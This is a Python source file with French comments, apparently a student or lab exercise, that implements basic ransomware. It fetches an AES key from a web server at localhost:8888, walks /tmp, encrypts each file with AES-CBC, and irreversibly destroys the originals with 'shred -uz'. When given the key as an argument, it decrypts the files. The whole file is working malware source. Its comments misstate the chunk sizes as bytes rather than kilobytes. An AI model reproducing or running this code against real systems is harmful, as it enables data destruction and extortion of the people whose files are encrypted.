from Crypto.Cipher import AES
from Crypto import Random
import os
import random
import struct
import requests
import sys
import subprocess

def encryptFile(key, filename, out_filename=None, chunksize=64*1024):
    '''
    Chiffre un fichier en utilisant l'algorithme AES-256
    key : clé utilisé pour le chiffrement
    filename : le fichier qu'on souhaite chiffrer
    out_filename : le fichier chiffré
    chunksize : taille de bloc que la fonction va lire, ici on prend des morceaux de 64 octets,
    		ce système permet de chiffrer des fichiers volumineux sans saturer la RAM. 
    '''

    if not out_filename:
        out_filename = filename + '.enc'

    iv = Random.new().read(AES.block_size)

    encryptor = AES.new(key, AES.MODE_CBC, iv)
    filesize = os.path.getsize(filename)

    with open(filename, 'rb') as infile:
        with open(out_filename, 'wb') as outfile:
            outfile.write(struct.pack('<Q', filesize))
            outfile.write(iv)

            while True:
                chunk = infile.read(chunksize)
                if len(chunk) == 0:
                    break
                elif len(chunk) % 16 != 0:
                    chunk += b' ' * (16 - len(chunk)%16)

                outfile.write(encryptor.encrypt(chunk))
    
    

def decryptFile(key, filename, out_filename=None, chunksize=24*1024):
    '''
    Déchiffre un fichier
    key : clé utilisé pour déchiffrer
    filename : le fichier qu'on souhaite déchiffrer
    out_filename : le fichier déchiffré
    chunksize : taille de bloc que la fonction va lire, ici 24 octets
    '''

    if not out_filename:
        out_filename = filename[:-4]

    with open(filename, 'rb') as infile:
        origsize = struct.unpack('<Q', infile.read(struct.calcsize('Q')))[0]
        iv = infile.read(16)
        decryptor = AES.new(key, AES.MODE_CBC, iv)

        with open(out_filename, 'wb') as outfile:
            while True:
                chunk = infile.read(chunksize)
                if len(chunk) == 0:
                    break
                outfile.write(decryptor.decrypt(chunk))

            outfile.truncate(origsize)


def main(argv):

    #faire une requête get au serveur web pour récupérer la clé et l'iv
    url = 'http://localhost:8888/key.txt'
    resp = requests.get(url)
    key=resp.text
    key=key.rstrip("\n")
    key= key.encode('utf-8')

    # a changer en /tmp
    directory = '/tmp'

    is_decrypt = None

    # récupère la clé en argument si il y en a un
    if len(argv) > 1:
        is_decrypt = True
        key = bytes(argv[1], 'utf-8')

    # récupère tous les fichiers présents dans directory
    for root, dirs, files in os.walk(directory, topdown=False):
       for name in files:
            file = os.path.join(root, name)
            #print(file)

            # déchiffrement
            if is_decrypt:
                if file[-4:] == ".enc":
                    #print("[*] Decrypting... ")
                    decryptFile(key, file)
	                #utilisation de commande bash shred pour supprimer de manière sécurisé les fichiers .enc
                    subprocess.check_output(["shred", "-uz", file])

            # chiffrement
            else:
                if file[-4:] != ".enc":
                    #print("[*] Encrypting... ")
                    encryptFile(key, file)
                    #utilisation de commande bash shred pour supprimer de manière sécurisé les fichiers d'origine
                    subprocess.check_output(["shred", "-uz", file])

    
    '''supprime de la variable et donc la référence à la zone mémoire ou est stocké la valeur de la key, il n'y plus de référence à cette valeur.
    Python via l'algo garbage collection détruit cette zone mémoire pour la réalouer à un nouvelle objet.
    La garbage collection a deux façon de fonctionner: comptage de références et générationnel. 
    - Si le nombre de références d'un objet atteint 0, l'algorithme de comptage de références nettoit la zone mémoire de l'objet.
    - Si il y a un cycle, l'algorithme de références est inefficace, c'est l'algorithme générationnel qui nettoie la zone mémoire
    '''
    del key

if __name__ == '__main__':
    main(sys.argv)
